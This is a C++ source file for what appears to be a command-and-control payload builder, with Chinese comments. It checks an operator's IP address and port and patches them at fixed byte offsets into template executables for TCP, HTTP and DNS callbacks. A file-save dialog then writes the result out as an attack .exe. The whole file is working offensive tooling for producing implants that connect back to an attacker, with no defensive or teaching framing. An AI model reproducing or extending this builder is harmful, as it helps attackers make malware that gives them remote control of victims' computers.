//PayloadGeneration.cpp
#include <Shlobj.h>
#include<clocale>
#include<iostream>
#include <fstream>
#include <vector>
#include <string>
#include <stdexcept>
#include <cctype>
#include <sstream>
#include <algorithm>
#include <windows.h>

#include "PayloadGeneration.h"

namespace FileSave {

    //bool attackFileSave(std::string name, std::string protocol, std::string ip, std::string port,LPWSTR filePath, LPWSTR fileName) {
    //    
    //    //根据用户提供的ip地址，端口号,通信协议类型等等制作pyload
    //    //在template.exe中ip地址偏移0x4240,port地址偏移0x424c，template.exe文件位于目录./template/template.exe下
    //    //获取用户输入的Ip,port，将ip和port转换为二进制的形式填入template.exe对应的位置，并保存到filePath和fileName组成的路径中。

    //    return true;
    //}

    std::vector<unsigned char> string_to_bytes(const std::string& s) {
        return std::vector<unsigned char>(s.begin(), s.end());
    }

    std::string validateIpFormat(const std::string& strIP) {
        std::vector<std::string> parts;
        std::stringstream ss(strIP);
        std::string part = "";
        int segmentCount = 0;

        while (getline(ss, part, '.')) {
            if (part.empty()) throw std::invalid_argument("IP段不能为空");
            if (++segmentCount > 4) throw std::invalid_argument("IP地址只能有4个段");

            if (!all_of(part.begin(), part.end(), ::isdigit))
                throw std::invalid_argument("IP段包含非数字字符");

            int num = stoi(part);
            if (num < 0 || num > 255)
                throw std::invalid_argument("IP段数值超出范围（0-255）");
        }

        if (segmentCount != 4)
            throw std::invalid_argument("IP地址必须有4个段");

        return strIP;
    }

    std::string validatePortFormat(const std::string& port) {
        if (port.empty()) throw std::invalid_argument("端口不能为空");
        if (!all_of(port.begin(), port.end(), ::isdigit))
            throw std::invalid_argument("端口包含非数字字符");

        int portNum = stoi(port);
        if (portNum < 1 || portNum > 65535)
            throw std::invalid_argument("端口值超出范围（1-65535）");

        return port;
    }
    void save(LPWSTR filePath, std::wstring templatePath, std::vector<unsigned char> ipBytes, std::vector<unsigned char> portBytes, const size_t ipOffset, const size_t portOffset) {
        std::wcout << templatePath << std::endl;
        std::wstring outputPath = std::wstring(filePath);

        std::ifstream in(templatePath, std::ios::binary | std::ios::ate);
        if (!in) throw std::runtime_error("无法打开模板文件");

        std::streamsize size = in.tellg();
        in.seekg(0, std::ios::beg);
        std::vector<unsigned char> buffer(size);

        if (!in.read(reinterpret_cast<char*>(buffer.data()), size))
            throw std::runtime_error("文件读取失败");

        if (buffer.size() < ipOffset + 15 || buffer.size() < portOffset + 5)
            throw std::runtime_error("文件大小不足");

        copy(ipBytes.begin(), ipBytes.end(), buffer.begin() + ipOffset);
        copy(portBytes.begin(), portBytes.end(), buffer.begin() + portOffset);

        std::ofstream out(outputPath, std::ios::binary);
        if (!out) throw std::runtime_error("无法创建输出文件");
        out.write(reinterpret_cast<char*>(buffer.data()), buffer.size());

        std::cout << "文件修改成功！生成文件: " << std::string(outputPath.begin(), outputPath.end()) << std::endl;
    }

    bool attackFileSave(std::string name, std::string protocol, std::string ip, std::string port, LPWSTR filePath, LPWSTR fileName) {
        try {
            std::string validIp = validateIpFormat(ip);
            std::string validPort = validatePortFormat(port);

            std::vector<unsigned char> ipBytes = string_to_bytes(validIp);
            ipBytes.resize(15, 0x00);

            std::vector<unsigned char> portBytes = string_to_bytes(validPort);
            portBytes.resize(5, 0x00);

            if (protocol == "tcp")
            {
                const size_t ipOffset = 0x5df0;
                const size_t portOffset = 0x5e00;
                std::wstring templatePath = L"./template/template_tcp.exe";
                save(filePath, templatePath, ipBytes, portBytes, ipOffset, portOffset);
            }
            else if (protocol == "http")
            {
                const size_t ipOffset = 0x8d80;
                const size_t portOffset = 0x8d90;
                std::wstring templatePath = L"./template/template_http.exe";
                save(filePath, templatePath, ipBytes, portBytes, ipOffset, portOffset);
            }
            else if(protocol == "dns")
            {
                const size_t ipOffset = 0xfe38;
                const size_t portOffset = 0xfe48;
                std::wstring templatePath = L"./template/template_dns.exe";
                save(filePath, templatePath, ipBytes, portBytes, ipOffset, portOffset);
            }

            return true;
        }
        catch (const std::exception& e) {
            std::cerr << "错误: " << e.what() << std::endl;
            return false;
        }
    }

    bool payloadSave(std::string name, std::string protocol, std::string ip, std::string port) {
        setlocale(LC_ALL, "");
        CoInitialize(NULL);

        IFileSaveDialog* pFileSave = nullptr;
        HRESULT hr = CoCreateInstance(
            CLSID_FileSaveDialog,
            NULL,
            CLSCTX_ALL,
            IID_IFileSaveDialog,
            reinterpret_cast<LPVOID*>(&pFileSave)
        );

        if (SUCCEEDED(hr)) {
            // 设置文件过滤器
            COMDLG_FILTERSPEC rgSpec[] = { { L"EXE", L"*.exe" }, { L"All", L"*.*" } };
            pFileSave->SetFileTypes(2, rgSpec);
            pFileSave->SetFileTypeIndex(1);

            // 显示对话框并检查返回值
            hr = pFileSave->Show(NULL);
            if (SUCCEEDED(hr)) {
                IShellItem* pItem = nullptr;
                hr = pFileSave->GetResult(&pItem);
                if (SUCCEEDED(hr)) {
                    LPWSTR filePath = nullptr;
                    LPWSTR fileName = nullptr;

                    // 获取路径和文件名
                    if (SUCCEEDED(pItem->GetDisplayName(SIGDN_DESKTOPABSOLUTEPARSING, &filePath)) &&
                        SUCCEEDED(pItem->GetDisplayName(SIGDN_NORMALDISPLAY, &fileName))) {
                        // 保存文件的逻辑
                        attackFileSave(name, protocol, ip, port, filePath, fileName);
                    }

                    // 释放内存
                    if (filePath) CoTaskMemFree(filePath);
                    if (fileName) CoTaskMemFree(fileName);
                    pItem->Release();
                }
            }

            pFileSave->Release();
        }

        CoUninitialize();
        return true;
    }
}